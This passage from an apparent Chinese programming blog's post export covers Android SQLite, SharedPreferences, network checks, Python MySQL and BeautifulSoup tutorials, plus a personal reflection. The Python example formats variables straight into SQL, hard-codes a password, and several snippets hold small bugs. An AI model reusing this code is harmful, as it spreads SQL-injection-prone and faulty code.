COLUMN_NAME_ID + &quot; INTEGER PRIMARY KEY AUTOINCREMENT,&quot; + COLUMN_NOTE_NO + &quot; TEXT NOT NULL DEFAULT \&quot;\&quot;,&quot; + COLUMN_NOTE_NAME + &quot; TEXT NOT NULL DEFAULT \&quot;\&quot;,&quot; + COLUMN_NOTE_AGE + &quot; INTEGER NOT NULL,&quot; + COLUMN_NOTE_SEX + &quot; TEXT NOT NULL DEFAULT \&quot;男\&quot;&quot; + &quot;)&quot; ); &#125; @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)&#123; // TODO Auto-generated method stub //在这里更新数据库版本 &#125;&#125; 在这个类被实例化的时候，系统会检测这个数据库是否存在，如果已经存在就不再创建，如果不存在则创建。还会检测数据库的版本，当版本号不同时会执行更新操作。 数据库基本操作SQLiteDataBase类提供了大量的API来操控SQLite数据库,每一个SQLiteDatabase的实例就代表了一个数据库(对应底层的一个数据库文件)，一旦应用程序获得了SQLiteDatabase对象，就可以通过该对象来操作与之相对应的数据库。 12SQLiteUtil mSqLiteUtil = new SQLiteUtil(this, &quot;fzy&quot;, null, 1);SQLiteDatabase db = mSqLiteUtil.getWritableDatabase(); //得到一个SQLiteDatabase对象 基本操作写法一对于插入、删除和更新来说都可以通过executeSQL方法执行sql语句来实现。 12db.executeSQL(String sql); db.executeSQL(String sql, Object[] bindArgs); //sql语句中使用占位符，然后第二个参数是实际的参数集 查询可以使用rawQuery方法执行sql语句来实现。 1db.rawQuery(String sql, String[] selectionArgs); 将所有的SQL语句都组织到一个字符串中，使用占位符代替实际参数，selectionArgs就是占位符实际参数集。 基本操作写法二除了统一的形式之外，他们还有各自的操作方法： 插入1db.insert(String table, String nullColumnHack, ContentValues values); 第一个参数都是表示要操作的表名，第二个参数表示如果插入的数据每一列都为空的话，需要指定此行中某一列的名称，系统将此列设置为NULL，不至于出现错误，第三个参数ContentValues类型的变量，是键值对组成的Map，key代表列名，value代表该列要插入的值。 删除1db.delete(String table, String whereClause, String whereArgs); 第一个参数都是表示要操作的表名，第二个参数是用来指定删除条件，传递空值时将删除所有行，第三个参数是删除条件的数组值，将与第二个参数组成条件字符串。 更新1db.update(String table, Contentvalues values, String whereClause, String whereArgs); 第一个参数都是表示要操作的表，第二个参数ContentValues类型的变量，是键值对组成的Map，key代表列名，value代表该列要插入的值。第三个参数用来指定更新条件，传递空值将更新所有行。第四个参数是更新条件的数组值，将与第三个参数组成条件字符串。 查询查询有很多不同参数的方法，这里只列举一例，其他的可以参考官方文档查看。1db.query(String table, String[] columns, String selection, String[] selectionArgs, String groupBy, String having, String orderBy); 第一个参数都是表示要操作的表名，第二个参数表示要查询的列所有名称集，第三个参数selection表示WHERE之后的条件语句，可以使用占位符，groupBy指定分组的列名，having指定分组条件，配合groupBy使用，orderBy指定排序的列名，limit指定分页参数，distinct可以指定“true”或“false”表示要不要过滤重复值。需要注意的是，selection、groupBy、having、orderBy、limit这几个参数中不包括“WHERE”、“GROUP BY”、“HAVING”、“ORDER BY”、“LIMIT”等SQL关键字。 结果集的处理最后，他们同时返回一个Cursor对象，代表数据集的游标，有点类似于JavaSE中的ResultSet。 方法 描述 move(int offset) 以当前位置为参考,移动到指定行 moveToFirst() 移动到第一行 moveToLast() 动到最后一行 moveToPosition(int position) 移动到指定行 moveToPrevious() 移动到前一行 moveToNext() 移动到下一行 isFirst() 是否指向第一条 isLast() 是否指向最后一条 isBeforeFirst() 是否指向第一条之前 isAfterLast() 是否指向最后一条之后 isNull(int columnIndex) 指定列是否为空(列基数为0) isClosed() 游标是否已关闭 getCount() 总数据项数 getPosition() 返回当前游标所指向的行数 getColumnIndex(String columnName) 返回某列名对应的列索引值 getString(int columnIndex) 返回当前行指定列的值 遍历结果集的方法： 1234567Cursor cs = db.query(传入相关参数); //得到结果集if(cs!=null)&#123; while(cs.moveToNext())&#123; cs.getString(cs.getColumnIndex(列名)); //通过列名获得列索引，然后再取出其值 //...获取更多的列值 &#125;&#125; Demo演示这篇博客准备很久了，之前只是知道怎么使用Android的SQLite数据库，并没有系统地去熟悉相关的知识，现在通过查看官方的API文档与别人的博客将这些知识整理了一下，自己写了一个小Demo来熟悉Android的SQLite数据库操作。 核心的代码如下： MainActivity.java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public void insertData() &#123; //插入数据 // 通过直接执行SQL语句来给学生表插入3条数据 db.execSQL(&quot;INSERT INTO &quot; + SQLiteUtil.TABLE_NAME_STUDENT + &quot; (Sno,Sname,Sage,Ssex) VALUES (&apos;2016001&apos;,&apos;fzy&apos;,&apos;22&apos;,&apos;男&apos;)&quot;); db.execSQL(&quot;INSERT INTO &quot; + SQLiteUtil.TABLE_NAME_STUDENT + &quot; (Sno,Sname,Sage,Ssex) VALUES (&apos;2016002&apos;,&apos;qwe&apos;,&apos;20&apos;,&apos;女&apos;)&quot;); db.execSQL(&quot;INSERT INTO &quot; + SQLiteUtil.TABLE_NAME_STUDENT + &quot; (Sno,Sname,Sage,Ssex) VALUES (&apos;2016003&apos;,&apos;asd&apos;,&apos;19&apos;,&apos;男&apos;)&quot;); // 使用insert方法来给学生表插入一条记录 ContentValues cv = new ContentValues(); cv.put(SQLiteUtil.COLUMN_NOTE_NO, &quot;20160004&quot;); cv.put(SQLiteUtil.COLUMN_NOTE_NAME, &quot;rty&quot;); cv.put(SQLiteUtil.COLUMN_NOTE_AGE, &quot;24&quot;); cv.put(SQLiteUtil.COLUMN_NOTE_SEX, &quot;男&quot;); db.insert(SQLiteUtil.TABLE_NAME_STUDENT, null, cv);&#125;public void deleteData() &#123; // 直接执行SQL语句删除学生表中Sage大于18的学生的所有信息 db.execSQL(&quot;DELETE FROM &quot; + SQLiteUtil.TABLE_NAME_STUDENT + &quot; WHERE Sage = 18&quot;); // 使用delete方法来删除学生表中_id大于1的学生的所有信息 db.delete(SQLiteUtil.TABLE_NAME_STUDENT, &quot;_id&gt;&quot;, new String[] &#123; &quot;1&quot; &#125;);&#125; public void updateData() &#123; // 直接执行SQL语句表中Sno为20160002的学生的名字Sname更新为xxx db.execSQL(&quot;UPDATE &quot; + SQLiteUtil.TABLE_NAME_STUDENT + &quot; SET Sname = &apos;xxx&apos; WHERE Sno = &apos;2016002&apos;&quot;); // 使用update方法来更新学生表中_id大于2的学生的年龄信息 ContentValues cv = new ContentValues(); cv.put(SQLiteUtil.COLUMN_NOTE_AGE, &quot;18&quot;); db.update(SQLiteUtil.TABLE_NAME_STUDENT, cv, &quot;_id&gt;?&quot;, new String[] &#123; &quot;2&quot; &#125;);&#125;public void queryData() &#123; Cursor cs = db.query(SQLiteUtil.TABLE_NAME_STUDENT, null, null, null,null, null, null, null); StringBuilder result = new StringBuilder(); while (cs.moveToNext()) &#123; //遍历结果集 String line = cs.getString(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_NO)) + cs.getString(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_NAME)) + cs.getInt(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_AGE)) + cs.getString(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_SEX)) + &quot;\n&quot;; result.append(line); &#125; mResult.setText(result); //使用TextView显示出来 cs.close();&#125; 通过在按钮的监听事件中调用这些方法就可以实现我的Demo的功能，这个Demo主要是通过不同的方式来实践数据库的操作，比较简单。效果如下： 数据库管理工具将程序运行在模拟器中后，我们可以打开DDMS工具看到我创建的数据库文件：fzy，将其导出到电脑，使用第三方工具查看。这里讲解一种比较方便的方法，直接使用SDK提供的数据库管理工具来操作，不需要每次更改都将数据库文件导出到windows，具体方法如下： 1、打开Windowsx系统的cmd窗口 2、进入到你的SDK目录下的platform-tools目录下，输入如下命令： 1adb shell 进入调试环境，然后输入如下命令进入到数据库文件夹： 12cd /data/data/包名/databasesls //查看有哪些数据库文件 然后，使用如下sqlite工具打开数据库文件 1sqlite3 数据库文件名 进入sqlite3命令行管理工具，可以通过以下命令进行操作，这与mysql数据库有些区别，命令都是以.号开。 12.help 查看帮助.tables 查看数据库中存在的表 然后就可以对相应的表执行sql语句啦！需要注意的是，sql语句末尾需要加分号，sqlite命令行工具的操作命令不需要加分号。 如下图所示： 参考博客： [1] Android中SQLite应用详解[2] Android 操作SQLite基本用法]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,SQLite］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[每个认真生活的人，都值得被认真对待]]></title>
    <url>%2F2016%2F07%2F25%2F%E6%AF%8F%E4%B8%AA%E8%AE%A4%E7%9C%9F%E7%94%9F%E6%B4%BB%E7%9A%84%E4%BA%BA%EF%BC%8C%E9%83%BD%E5%80%BC%E5%BE%97%E8%A2%AB%E8%AE%A4%E7%9C%9F%E5%AF%B9%E5%BE%85%2F</url>
    <content type="text"><![CDATA[突然，有那么一刻，我会特别想哭。平时，很少总结也很少煽情，现在，回想总结起来，带实验室的这一年里，收获很多，感慨也很多。 这一年里，自己真的花了很多时间很多精力，想各种办法来带大家，虽然我现在也知道自己当时讲课讲得并不好，大家可能在我的课堂上并没有学到太多的东西，所以也很感谢大家能一直听我讲完。现在回想起来可能也是自己当时太急了，想尽快把大家都教会，所以课程讲得很快，也没有很好的考虑大家的感受。也因为深知责任重大，我将自己的很多时间都花在了这里。大三第一个学期，正在带14级的学弟学妹，平时上课，周末的时间都花在实验室，然而自己又报名了软考，那段时间，很纠结，要带大家就不能好好复习，结果第一次考果然没过，还好这学期顺利拿到了软件设计师的证。然后为了蓝桥杯的板子，压缩复习时间，到实验室和陈老师一起调试板子，都是为了大家能够有一个好的训练平台，拿个好的名次。想想，那些纠结的时候义无反顾的抉择又有多少人知道，现在想起来，真的很艰难。但是，看到现在实验室取得的成绩，我也是很感动的，毕竟努力有了收获。 其实，一年下来，坚持下来的人是一定有收获的。有的人慢慢的慢慢的就放弃了，很可惜，这一路上，见证了很多中途退出的人，我也曾经试图挽留，但是都没能留得住。或许，每个人都有每个人的理想。能够一直坚持下来的也算是一种缘分，因为已经不记得有多少个在203奋斗的深夜，不记得有多少一起开怀大笑的日子。也只有真正经常混在一起的这一群人才会有机会一起去聚餐了吧，在一起喝喝酒，聊聊天，就这样也挺好。 这一路走来，要感谢的人也很多。 首先就是一直给予我们支持的指导老师了，很感谢匡老师的到来，没有她也没有实验室的今天，曾经想要放弃的我，在匡老师的带领下一起把实验室带到今天的样子，没有她的支持也没有我当初努力的样子。还记得去北京参加蓝桥杯国赛的时候，比赛完感觉不太好，心情差极了，就怕对不起一直给我们支持和鼓励的匡老师，不过还好，虽然没拿一等奖，但是成绩也不坏。在实验室的管理方面，匡老师确实花了不少的功夫，在协调各个指导老师的时候，我也知道有多难，因为一个实验室五个指导老师，很多事情都需要去协调去处理。然后，就是一直带我们的陈老师了，这学期很多的比赛获奖都是在陈老师的带领下获得的，也确实，陈老师自己也付出了很多，这学期在实验室经常能见到他忙碌的身影，对于每个比赛他都认真对待，自然也能够获得不错的成绩。然后，很感谢陈老师能够和我一起把蓝桥杯的板子做好，这块板子确实起了很大的作用。技术方面，陈老师确实付出了不少，感谢！ 其次，要感谢13级的这几个小伙伴，是你们的坚持，造就了实验室的今天，一直都是你们在支持着我，很感谢，没有你们的付出也没有实验室今天的成绩。看到现在大家的成长我也是很欣慰的，大家都要找工作了，希望大家都能有个美好的未来，说不定以后就是我的面试官了呢，哈哈。 最后，还是要感谢欧超、杨勇锋、李维维等学长为这个实验室的付出，没有你们的基础也没有实验室今天的发展。谢谢欧超学长带我走进这个实验室，带我学习单片机，谢谢杨勇锋学长为电子协会的辛勤付出，也谢谢李维维学长带了我几个假期，还谢谢其他学长平时对我的教导。没有一届一届的付出也就没有未来，希望这种精神能够一届届传递下去。 一直觉得自己是一个很幸运的人，因为大学三年来一直有老师的关心与支持，有学长学姐的帮助与指引，有小伙伴的共同努力，有学弟学妹们的支持。一直很相信一句话：每个认真生活的人，都值得被认真对待。希望你们也如此。 电子设计创新实验室的时光，谢谢有你！]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python操作Mysql数据库]]></title>
    <url>%2F2016%2F07%2F24%2FPython%E6%93%8D%E4%BD%9CMysql%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[在正式开始Python网络爬虫实战之前，我们需要先来了解一下Python的一些基础知识，包括网络请求、数据存储以及异常处理等，这篇博客主要讲解Python的Mysql数据库操作，我们使用爬虫爬取下来的数据需要存储，而数据库就是常用的存储方式之一，所以熟练地掌握数据库操作对于网络爬虫的学习是很有必要的。 安装访问数据库的类库windows下cmd直接执行如下命令进行安装：1pip install pymysql 注：如果没有安装pip包管理器，请先安装pip才能用此命令安装pymysql 基本操作导入库1import mysql 连接数据库123456conn = pymysql.connect(host = &apos;localhost&apos;, user = &apos;你的用户名&apos;, passwd = &apos;你的密码&apos;, charset=&apos;utf8&apos;) #得到连接对象cur=conn.cursor() #得到游标对象cur.execute(&quot;USE school&quot;) #指定使用哪个数据库 插入、查询等基本操作创建表：1cur.execute(&quot;CREATE TABLE student (id TINYINT, Sno VARCHAR(255) UNIQUE KEY, )&quot;) 插入数据：方式一：直接赋值 12cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (&apos;20160001&apos;, &apos;xxx&apos;, 20, &apos;男&apos;)&quot;)conn.commit() #更改数据后需进行提交 方式二：由变量赋值 123456Sno = &apos;20160004&apos;Sname = &apos;lll&apos;Sage = &apos;20&apos;Ssex = &apos;男&apos;cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (\&quot;%s\&quot;,\&quot;%s\&quot;,\&quot;%s\&quot;,\&quot;%s\&quot;)&quot;%(Sno, Sname, Sage, Ssex))conn.commit() #更改数据后需进行提交 查询数据：1cur.execute(&quot;SELECT * FROM Student&quot;) 打印查询结果：12print cur.fetchone() #打印第一条查询结果print cur.fetchall() #打印所有查询结果 关闭连接12cur.close()conn.close() 完整示例创建一张学生表，有id，学号、姓名、年龄、性别五列，然后插入四条数据，在进行查询并打印所有查询结果。 1234567891011121314151617181920212223242526272829303132333435# -*- coding:utf8 -*-import pymysqlconn = pymysql.connect(host = &apos;localhost&apos;, user = &apos;root&apos;, passwd = &apos;fzy1686&apos;, charset=&apos;utf8&apos;)cur=conn.cursor()cur.execute(&quot;USE school&quot;)try: cur.execute(&quot;CREATE TABLE Student (id BIGINT(10) NOT NULL AUTO_INCREMENT,\ Sno VARCHAR(20) NOT NULL,\ Sname VARCHAR(20) NOT NULL,\ Sage VARCHAR(10) NOT NULL,\ Ssex VARCHAR(10) DEFAULT &apos;男&apos;,\ PRIMARY KEY(id))&quot;) cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (&apos;20160001&apos;, &apos;xxx&apos;, 20, &apos;男&apos;)&quot;) cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (&apos;20160002&apos;, &apos;yyy&apos;, 18, &apos;女&apos;)&quot;) cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (&apos;20160003&apos;, &apos;zzz&apos;, 22, &apos;女&apos;)&quot;) Sno = &apos;20160004&apos; Sname = &apos;lll&apos; Sage = &apos;20&apos; Ssex = &apos;男&apos; cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (\&quot;%s\&quot;,\&quot;%s\&quot;,\&quot;%s\&quot;,\&quot;%s\&quot;)&quot;%(Sno, Sname, Sage, Ssex)) conn.commit() cur.execute(&quot;select * from Student&quot;) print cur.fetchall()finally: cur.close() conn.close()]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android数据存储之SharedPreferences]]></title>
    <url>%2F2016%2F07%2F21%2FAndroid%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E4%B9%8BSharedPreferences%2F</url>
    <content type="text"><![CDATA[SharedPreferences是一种轻型的数据存储方式，它的本质是基于xml文件存储的key-value键值对数据，它的使用非常简单,能够轻松的存放数据和读取数据。App都有相应的配置文件，但是由于App的配置信息并不多，如果采用数据库来存放并不划算，因为数据库连接跟操作等耗时大大影响了程序的效率，因此通常使用SharedPreferences来存储一些简单的配置信息。 使用SharedPreferences保存数据获得SharedPreferences对象使用getSharedPreferences方法得到SharedPreferences对象，该方法有两个参数，第一个参数是文件名，第二个参数是权限模式。文件名不需要加后缀，系统在生成该文件时会自动加上.xml后缀。 SharedPreferences的四种操作模式:Context.MODE_PRIVATE：为默认操作模式,代表该文件是私有数据,只能被应用本身访问,在该模式下,写入的内容会覆盖原文件的内容. Context.MODE_APPEND：模式会检查文件是否存在,存在就往文件追加内容,否则就创建新文件. Context.MODE_WORLD_READABLE和Context.MODE_WORLD_WRITEABLE用来控制其他应用是否有权限读写该文件. Context.MODE_WORLD_READABLE：表示当前文件可以被其他应用读取. Context.MODE_WORLD_WRITEABLE：表示当前文件可以被其他应用写入. 获取Editor对象，并使用相应的方法来创建、修和清除数据调用该SharedPreferences对象的Editor接口得到一个Editor对象，使用该对象有putInt，putString等putXxx方法来存储键值对信息，通过remove()方法来移除一个键值对，或者通过clear()方法来清除数据等。 使用commit()方法提交数据。12345SharedPreferences sharedPreferences = getSharedPreferences(&quot;mysp&quot;,Context.MODE_PRIVATE);Editor editor=sharedPreferences.edit();editor.putString(&quot;name&quot;, &quot;fzy&quot;);editor.putString(&quot;age&quot;, &quot;22&quot;);editor.commit(); //提交数据 记得每次更改数据后都要调用editor对象的commit()方法提交数据，执行以上代码后，SharedPreferences将会把这些数据保存在mysp.xml文件中，可以打开eclipse的DDMS工具在File Explorer的data/data/相应的包名/shared_prefs/mysp.xml 下导出该文件，并查看。（如下图红色箭头标注） 我们可以将此xml文件导出来看看，点击右上角pull a file from the device(如下图蓝色箭头标注) 从SharedPreferences获取数据1234SharedPreferences sharedPreferences=getSharedPreferences(&quot;mysp&quot;, Context.MODE_PRIVATE);String name=sharedPreferences.getString(&quot;name&quot;, &quot;defaultname&quot;);String age=sharedPreferences.getString(&quot;age&quot;, &quot;0&quot;);System.out.println(&quot;name: &quot;+ name + &quot;,age: &quot; + age); 取出结果如下：]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,SharedPreferences］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android真机抓屏- Android Screen Monitor]]></title>
    <url>%2F2016%2F07%2F21%2FAndroid%E7%9C%9F%E6%9C%BA%E6%8A%93%E5%B1%8F-Android-Screen-Monitor%2F</url>
    <content type="text"><![CDATA[最近遇到一个比较尴尬的问题，博客需要做一个Android手机网络状态检测的操作演示gif动图，虽然找到一款可以在电脑上录屏并自动生成gif文件的软件，但是eclipse自带的模拟器又不能切换到GPRS网络，于是，想着将真机的屏幕分享到电脑再进行录屏操作，试了华为助手和360助手，但是他们都需要全屏演示，不能很好的结合我的录屏软件，于是又百度找了找，最后还真有个小工具可以实现真机抓屏，反应还挺快，这就是Android Screen Monitor。 ASM简介Android Screen Monitor，简称为ASM，它是一个监视设备或模拟器屏幕的工具，ASM是 ADB调试桥的客户端应用程序，当ASM开始监控屏幕的时候，它通过5037端口连接至ADB，不断地把所监控设备的屏幕数据保存在帧缓存中并且把图像数据转换成用户可观测的内容。 ASM使用方法1、确保你的手机可以进行真机调试 一般我们只要将手机通过USB连接上电脑，并打开USB调试，允许电脑控制我们的手机，然后将项目运行看是否能够运行在我们的真机。 2、ASM下载 最新版本是2.5，下载地址： https://code.google.com/p/android-screen-monitor/downloads/list 貌似要翻墙才能下载，不想翻墙单的话可以私聊我。 3、解压后文件夹中的asm.jar复制到Android SDK的platform-tools目录下 4、打开ASM 方法一：打开cmd，进入到Android SDK的platform-tools目录，然后输入如下命令 1java -jar asm.jar 方法二：直接双击Android SDK的platform-tools目录下的asm.jar文件 5、进入选择界面，选择我们的手机 6、进行相关配置 可右键选择调整窗体大小 至此，我们就实现了将自己的手机屏幕分享到电脑的功能，赶快来体验一下反应快、画面流畅的Android Screen Monitor吧。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,Screen Monitor］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android 网络状态检查总结]]></title>
    <url>%2F2016%2F07%2F20%2FAndroid-%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81%E6%A3%80%E6%9F%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[几乎每个具有连网功能的App都会有网络检测代码专门负责网络检测，需要实时检测网络是否可用，当出现网络不可用或者无连接时提示用户，当需要观看视频时自动检测是否处于wifi网络，并提示用户避免带来大量的流量消耗，所有的这些功能都是为了使App的用户体验更好。此篇博客主要介绍检测网络状态的相关方法，并通过一个小例子来实现实时的网络状态检测。 添加权限在AndroidManifest.xml文件添加： 12&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; 编写相应的检测方法判断网络是否可用的方法12345678910public boolean isNetworkAvailable(Context context) &#123; ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); if (mConnectivityManager != null) &#123; NetworkInfo mNetworkinfo = mConnectivityManager.getActiveNetworkInfo(); if (mNetworkinfo != null) &#123; return mNetworkinfo.isAvailable(); &#125; &#125; return false;&#125; 判断WIFI网络是否连接上的方法1234567891011public boolean isWifiConnected(Context context) &#123; ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); if (mConnectivityManager != null) &#123; NetworkInfo mWiFiNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI); if (mWiFiNetworkInfo != null &amp;&amp; mWiFiNetworkInfo.isConnected()) &#123; return true; &#125; &#125; return false;&#125; 判断GPRS网络是否连接上的方法1234567891011public boolean isMobileConnected(Context context) &#123; ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); if (mConnectivityManager != null) &#123; NetworkInfo mMobileNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); if (mMobileNetworkInfo != null &amp;&amp; mMobileNetworkInfo.isConnected()) &#123; return true; &#125; &#125; return false;&#125; 获取所连接网络的类型的方法1234567891011public String getNetworkType(Context context) &#123; ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); if (mConnectivityManager != null) &#123; NetworkInfo mNetworkinfo = mConnectivityManager.getActiveNetworkInfo(); if (mNetworkinfo != null &amp;&amp; mNetworkinfo.isAvailable()) &#123; String info = &quot;Type: &quot; + mNetworkinfo.getType() + &quot; Name: &quot;+ mNetworkinfo.getTypeName(); return info; &#125; &#125; return &quot;网络无连接，请检查网络&quot;; &#125; 实现网络状态监测使用Service+BroadcastReceiver来实现相应的功能。 编写网络状态检测类12345678910111213141516171819public class NetState extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; // TODO Auto-generated method stub ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); if (mConnectivityManager != null) &#123; NetworkInfo mMobileNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); NetworkInfo mWiFiNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI); if (!mMobileNetworkInfo.isConnected()&amp;&amp; !mWiFiNetworkInfo.isConnected()) &#123; Toast.makeText(context, &quot;网络连接断开，请检查网络&quot;, Toast.LENGTH_SHORT).show(); &#125; else &#123; Toast.makeText(context, &quot;网络连接成功&quot;, Toast.LENGTH_SHORT).show(); &#125; &#125; &#125;&#125; 在Activity的onCreate方法中注册监听12345NetState mNetState = new NetState(); //获取网络监听实例IntentFilter mFilter = new IntentFilter(); //获取意图过滤器实例mFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION); //过滤Action，使只监听网络动作事件的广播this.registerReceiver(mNetState, mFilter); //注册广播接收器mNetState.onReceive(this, null); //调用广播接收方法 效果演示自己写了一个Android网络检测的演示demo，使用了刚刚学会的录屏生成动图软件以及刚刚安装上的wordpress动图插件。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,网络］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫利器---BeautifulSoup]]></title>
    <url>%2F2016%2F07%2F17%2FPython%E7%88%AC%E8%99%AB%E5%88%A9%E5%99%A8-BeautifulSoup%2F</url>
    <content type="text"><![CDATA[Beautiful Soup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。 BeautifulSoup4安装由于BeatifulSoup库不是Python标准库，因此需要单独安装。 在Linux系统上安装1$sudo apt-get install python-bs4 在Windows系统安装可以利用 pip 或者 easy_install 来安装 1pip install beautifulsoup4 1easy_install beautifulsoup4 Beautifulsoup4使用导入库（1）导入网络请求库 Python2.x里的urllib2与urllib有些不同，在Python3.x里，urllib2改名为urllib，被分成一些子模块：urllib.request、urllib.parse、urllib.error。所以不同的版本使用时略有区别。 Python3.x版本：1from urllib.request import urlopen Python2.x版本：1from urllib import urlopen （2）导入Beautifulsoup41from bs4 import BeautifulSoup 运行Beautifulsoup首先我准备了一个简单的测试页面，网址是：blog.line-coding.tech，页面的结构如下： 可以看到我们的img标签在红色箭头标注的位置，我们通过代码一步步的去获取中心404图片的url地址，如下： Python3.x版本： 123456789from urllib.request import urlopenfrom bs4 import BeautifulSouphtml = urlopen(&quot;http://blog.line-coding.com&quot;)bsObj = BeautifulSoup(html.read())print(bsObj.body)print(bsObj.body.div)print(bsObj.body.div.div)print(bsObj.body.div.div.img)print(bsObj.body.div.div.img[&apos;src&apos;]) Python2.x版本： 123456789import urllibfrom bs4 import BeautifulSouphtml = urllib.urlopen(&quot;http://blog.line-coding.com&quot;)bsObj = BeautifulSoup(html,&quot;html.parser&quot;)print bsObj.body #得到body标签的内容print bsObj.body.div #得到body标签下div标签的内容print bsObj.body.div.div #得到body标签下div标签下的div标签的内容print bsObj.body.div.div.img #得到img标签的内容print bsObj.body.div.div.img[&apos;src&apos;] #得到图片url地址 结果如下： 有了Beautiful4，我们就可以将网页代码转换成一个对象，并通过再通过.号去访问这个对象的信息，一级一级的去查找来所需的信息。接下来的博客中，我会使用Beautiful4来进行数据爬取，敬请关注。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>BeautifulSoup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android ip地址信息查询]]></title>
    <url>%2F2016%2F07%2F12%2FAndroid-ip%E5%9C%B0%E5%9D%80%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[上一篇博客中我们讲解了如何获取外网的ip地址，获取到的ip地址总是会有用的，我们现在就来使用它，通过查询ip地址的相关信息我们可以获取当前所在城市信息，即ip地址定位。其实，实现起来也比较简单，主要还是使用的第三方API接口，通过http请求来获取信息。 实现方法百度API Store Ip地址定位API的使用上一步我们获取了本机的外网ip地址，然后我们使用百度API Store的ip地址定位API来进行ip地址定位。API的地址，他有很详细的文档，可以很容易使用。通过Http的GET方法将ip地址发送给服务器，将获取JSON格式的返回值进行解析即可实现定位。如下图所示： android-async-httpandroid-async-http是一个第三方网络请求库，由于在上一篇博客中我们已经为工程添加android-async-http的jar包，所以这里不需要重复添加，可直接进入下一步。 代码编写Handler新建一个Handler用于将Http请求获得的定位数据传回Activity： 123456789101112131415161718192021private Handler mCityHandler = new Handler() &#123; public void handleMessage(Message msg) &#123; String res = (String) msg.obj; //获取传回的定位数据 res = decodeUnicode(res); System.out.println(res); mAddr.setText(res); //显示ip地址定位信息 //也可以进一步解析JSON数据取出所在国家、省份、城市等信息 try &#123; JSONObject js = new JSONObject(res); js = js.getJSONObject(&quot;retData&quot;); String country = js.getString(&quot;country&quot;); String province = js.getString(&quot;province&quot;); String city = js.getString(&quot;city&quot;); System.out.println(&quot;city:&quot; + city); &#125; catch (JSONException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;;&#125;; Http请求在IpHttpUtil类中编写Http请求静态方法，这里还是使用的android-async-http网络请求库，因为它方便、简洁，而且稳定，所以一直喜欢用它。 1234567891011121314151617181920212223242526272829303132333435363738public static void getAddress(final Handler handler, String ip) &#123; //定位信息请求地址 String url = &quot;http://apis.baidu.com/apistore/iplookupservice/iplookup&quot;; AsyncHttpClient client = new AsyncHttpClient(); client.addHeader(&quot;apikey&quot;, &quot;这里填你自己百度API商店注册后的apikey&quot;); RequestParams params = new RequestParams(); params.add(&quot;ip&quot;, ip); //添加参数 client.get(url, params, new AsyncHttpResponseHandler() &#123; @Override public void onSuccess(int arg0, Header[] arg1, byte[] bytes) &#123; // TODO Auto-generated method stub String response = null; try &#123; response = new String(bytes, &quot;GBK&quot;); //获取服务器返回数据 &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; Message msg = new Message(); msg.obj = response; handler.sendMessage(msg); &#125; @Override public void onFailure(int arg0, Header[] arg1, byte[] bytes, Throwable arg3) &#123; // TODO Auto-generated method stub String response = null; try &#123; response = new String(bytes, &quot;GBK&quot;); &#125; catch (UnsupportedEncodingException e) 